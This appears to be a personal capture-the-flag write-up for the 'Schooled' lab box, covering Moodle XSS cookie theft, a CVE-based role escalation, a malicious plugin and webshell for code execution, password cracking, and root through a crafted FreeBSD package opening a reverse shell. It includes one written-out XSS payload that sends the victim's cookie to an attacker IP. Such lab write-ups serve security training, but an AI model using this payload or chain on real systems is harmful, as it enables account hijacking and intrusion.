# Summary
- Takeaways:
	- make sure to search for CVEs on MITRE or another database, don't always come up on search engines
	- continue to use `find` to search for file and binaries when they aren't in usual spots or on PATH
	- focus more on things that seem to be hints
	- XSS is a possibility on newer boxes
- User: XSS to login as teacher, CVE to elevate to manager and grant new permissions, upload malicious plugin to get RCE, crack creds from MySQL database to get user
- Root: user is able to run `pkg` as user and can abuse it to install a custom malicious package that runs arbitrary commands

# Details
### User
- scan reveals port 22, 80, and 33060 are open
	- "mysqlx" running on 33060, but unable to log in, even after getting foothold and MySQL creds
- website shows landing page for a school, several pages mention Moodle
- checking subdomain at "moodle.schooled.htb" gives access to Moodle install
- able to create a user and self-enroll in the Mathematics course
- math teacher has a post that mentions everyone must link to their Moodlenet profile and that he will be checking it
- possible to set Moodlenet link in profile, and the field is vulnerable to XSS
- can insert script that sends cookie to us, the "teacher" will periodically visit our profile so it's possible to steal their cookie and login as them
	- `<script>window.location="http://10.10.14.110:8000/?data=" + document.cookie</script></script><script src=file:///etc/passwd></script>`
- after logging in as teacher, can use CVE and "log in as" functionality to gain manager permissions, install a malicious plugin, and achieve RCE
	- some difficulty with this privesc, intercepting the requests and changing the id and role id rarely seems to work (only worked once)
	- https://github.com/HoangKien1020/CVE-2020-14321
	- https://vimeo.com/441698193
	- must enroll other teacher who has "manager" permissions in our class, intercept the request and change the ID to ours and the role id to 1 (manager)
	- must then actually enroll the teacher into our class before visiting their profile and using "log in as" to impersonate them
	- can then configure roles to grant extra privileges to managers (which we now are) that will allow them to install plugins
	- can then upload malicious plugin (zipfile) that can execute code
	- malicious plugin is somewhat unreliable, so best to use it to write a small PHP webshell into a retrievable directory and use that instead
- foothold on the server allows us to retrieve MySQL creds from `config.php`
- can also see users `jamie` and `steve` in the home directory
- searching through the users in the MySQL database shows that there is a "Jamie" in there as well (also in our class)
- cracking their password with `john` allows us to login as them and grab the flag

### Root
- `jamie` is able to run `pkg` with `sudo` and can install arbitrary packages
- possible to use `fpm` to build a malicious FreeBSD package that executes a script prior to install
- can insert any commands into the script and open a reverse shell as root

#### Tags: FreeBSD, XSS, fpm, redo because of issues
